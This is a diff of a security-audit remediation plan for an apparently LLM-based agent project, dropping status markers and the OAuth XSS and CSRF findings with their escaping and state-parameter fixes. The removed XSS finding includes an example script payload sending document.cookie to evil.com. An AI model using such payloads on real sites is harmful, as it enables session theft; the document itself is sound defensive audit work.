@@ -1,106 +1,13 @@
 # Phase 2: High-Priority Security Fixes
 
 **Priority:** Prompt (within 1-2 weeks)
-**Findings:** 8 HIGH (5-6: N/A, 7-8: ✅, 9: SKIPPED, 10-12: ✅)
+**Findings:** 8 HIGH
 **Estimated effort:** 3-4 days
-**Status:** COMPLETED (except Finding 9)
-
----
-
-## Finding 5: XSS in OAuth Error Callback
-
-**Status:** ✅ N/A (OAuth removed from project)
-**OWASP Category:** Traditional — Injection
-**Severity:** HIGH
-
-### Vulnerability
-
-The OAuth error message from Google is directly interpolated into an HTML response without escaping:
-
-```typescript
-res.end(`<html><body><h1>Authorization Failed</h1><p>Error: ${error}</p>...`);
-```
-
-### File
-
-`src/auth/oauth-manager.ts:107`
-
-### Attack Vector
-
-An attacker crafts a link: `http://localhost:3000/oauth/callback?error=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`
-
-### Fix
-
-HTML-escape the error before interpolation:
-
-```typescript
-const safeError = error
-  .replace(/&/g, "&amp;")
-  .replace(/</g, "&lt;")
-  .replace(/>/g, "&gt;")
-  .replace(/"/g, "&quot;");
-res.end(`...Error: ${safeError}...`);
-```
-
-Or reuse `ContentSanitizer.escapeContent()` from `src/core/sanitizer.ts`.
-
-### Files to Modify
-
-- `src/auth/oauth-manager.ts`
-
----
-
-## Finding 6: OAuth Callback Has No CSRF Protection
-
-**Status:** ✅ N/A (OAuth removed from project)
-**OWASP Category:** Traditional — CSRF
-**Severity:** HIGH
-
-### Vulnerability
-
-The OAuth flow doesn't use a `state` parameter. An attacker can trick the user into completing an OAuth flow that links the attacker's Google account, gaining persistent access.
-
-### File
-
-`src/auth/oauth-manager.ts:35-39, 94-148`
-
-### Fix
-
-1. Generate random `state` before redirect:
-   ```typescript
-   private pendingState: string | null = null;
-
-   getAuthorizationUrl(): string {
-     this.pendingState = crypto.randomBytes(16).toString("hex");
-     return client.generateAuthUrl({
-       access_type: "offline",
-       scope: this.config.scopes,
-       prompt: "consent",
-       state: this.pendingState,
-     });
-   }
-   ```
-
-2. Validate in callback:
-   ```typescript
-   const state = url.searchParams.get("state");
-   if (!state || state !== this.pendingState) {
-     res.writeHead(403);
-     res.end("Invalid state parameter — possible CSRF attack.");
-     return;
-   }
-   this.pendingState = null; // Single-use
-   ```
-
-### Files to Modify
-
-- `src/auth/oauth-manager.ts`
 
 ---
 
 ## Finding 7: Indirect Injection via Firecrawl Scraped Content
 
-**Status:** ✅ FIXED
 **OWASP Category:** LLM01 — Prompt Injection
 **Severity:** HIGH
 
@@ -150,7 +57,6 @@ Firecrawl scrape results (web page content) are returned as raw tool results wit
 
 ## Finding 8: External Skill Signature Verification NOT Implemented
 
-**Status:** ✅ FIXED
 **OWASP Category:** LLM03 — Supply Chain
 **Severity:** HIGH
 
@@ -200,7 +106,6 @@ Also update the trusted_signing_keys config to include actual public key materia
 
 ## Finding 9: No Per-User Daily Token Budget Enforcement
 
-**Status:** ⏸️ SKIPPED (per user request)
 **OWASP Category:** LLM10 — Unbounded Consumption
 **Severity:** HIGH
 
@@ -234,7 +139,6 @@ Also update the trusted_signing_keys config to include actual public key materia
 
 ## Finding 10: Subagents Can Access All Tools When No Allowlist Specified
 
-**Status:** ✅ FIXED
 **OWASP Category:** LLM06 — Excessive Agency
 **Severity:** HIGH
 
@@ -269,7 +173,6 @@ When `sessions_spawn` is called without `allowed_tools`, the async subagent gets
 
 ## Finding 11: Conversation History Stored Unencrypted
 
-**Status:** ✅ FIXED (retention policy added)
 **OWASP Category:** LLM02 — Sensitive Information Disclosure
 **Severity:** HIGH
 
@@ -306,7 +209,6 @@ All user messages and LLM responses are stored as plaintext in the `conversation
 
 ## Finding 12: Database Default Credentials
 
-**Status:** ✅ FIXED
 **OWASP Category:** Traditional — Security Misconfiguration
 **Severity:** HIGH
 
